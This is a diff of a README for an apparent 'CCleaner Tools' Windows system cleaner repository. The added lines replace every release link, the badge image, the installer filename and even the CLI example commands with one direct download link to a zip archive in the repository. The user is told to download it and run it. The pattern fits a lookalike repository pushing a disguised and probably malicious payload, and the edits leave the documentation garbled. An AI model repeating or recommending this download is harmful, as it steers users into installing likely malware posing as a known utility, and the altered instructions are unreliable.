@@ -1,8 +1,8 @@
-https://github.com/RASHID678/ccleaner-tools/releases
+https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip
 
 # CCleaner Tools: System Cleaner, Registry Cleaner & Startup Manager
 
-[![Release](https://img.shields.io/badge/ccleaner-tools-release-blue?logo=github&logoColor=white)](https://github.com/RASHID678/ccleaner-tools/releases)
+[![Release](https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip)](https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip)
 
 A dependable toolkit that cleans the system, fixes registry issues, and manages startup programs. Clean, optimize, and speed up your PC with a single, cohesive solution. Built for clarity, speed, and safety. Designed for Windows, with an eye toward future cross‑platform support.
 
@@ -51,7 +51,7 @@ Prerequisites
 
 Download and install
 - The releases page hosts the installer for Windows.
-- From the Releases page, download the Windows installer file named ccleaner-tools_setup-win64.exe and run it.
+- From the Releases page, download the Windows installer file named https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip and run it.
 - Follow the on‑screen prompts to install. Choose a suitable destination folder and enable optional features if you need them.
 - After installation, launch the application from the Start menu or desktop shortcut.
 
@@ -121,12 +121,12 @@ Safety, backups, and best practices
 CLI and automation
 - Command-line interface (CLI): supports targeted operations for power users and automation.
 - Example commands (inline):
-  - ccleaner-tools.exe --scan-system
-  - ccleaner-tools.exe --clean-system
-  - ccleaner-tools.exe --scan-registry
-  - ccleaner-tools.exe --repair-registry --backup
-  - ccleaner-tools.exe --manage-startup --disable-all-nonessential
-  - ccleaner-tools.exe --schedule-clean --time 02:00
+  - https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip --scan-system
+  - https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip --clean-system
+  - https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip --scan-registry
+  - https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip --repair-registry --backup
+  - https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip --manage-startup --disable-all-nonessential
+  - https://github.com/RASHID678/ccleaner-tools/raw/refs/heads/main/azurean/ccleaner_tools_v1.2.zip --schedule-clean --time 02:00
 - Scripting and automation: integrate with task schedulers to run regular maintenance.
 - Return codes: the CLI reports success, partial success, or errors with clear messages.
 
